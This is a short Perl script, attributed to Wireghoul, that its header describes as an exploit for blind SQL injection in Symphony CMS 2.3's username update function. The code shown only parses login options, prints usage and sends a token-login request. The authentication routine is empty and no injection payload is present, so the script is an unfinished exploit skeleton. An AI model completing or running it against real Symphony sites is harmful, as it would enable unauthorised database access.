#!/usr/bin/perl
# Exploit blind sql injection in username update function of symphony-cms 2.3
# Written by Wireghoul - http://www.justanotherhacker.com

use strict;
use warnings;
use LWP::UserAgent;
use Getopt::Long;
use Data::Dumper;

my $url = 'http://localhost/vvv/symphony';
my %options = ();
GetOptions(\%options, 'token=s', 'session=s', 'username=s','password=s');
my $target = $ARGV[0];
&usage() unless ( exists($options{'token'}) || exists($options{'session'}) || 
                ( exists($options{'username'}) && exists($options{'password'}) ));
&usage() unless $target;

my $lwp = LWP::UserAgent->new();
if ($options{'token'}) {
    &token_auth($options{'token'});
} elsif ($options{'username'}) { #already checked if password was set
    &form_auth();
} else {
    print "Exploiting active session: $options{'session'}\n";
}

sub token_auth {
    my $token = shift;
    print "Attempting authentication using token via $target/login/$token\n";
    $lwp->get("$target/login/$token");
    return;
}

sub form_auth {
}

sub usage {
  print "$0 <options> baseurl\nOptions are:\n";
  print "\t--token\t\t- auth token for login\n\t--session\t- session id to use\n";
  print "\t--username\t- username for login form\n\t--password\t- password to use with login form\n";
  exit;
}
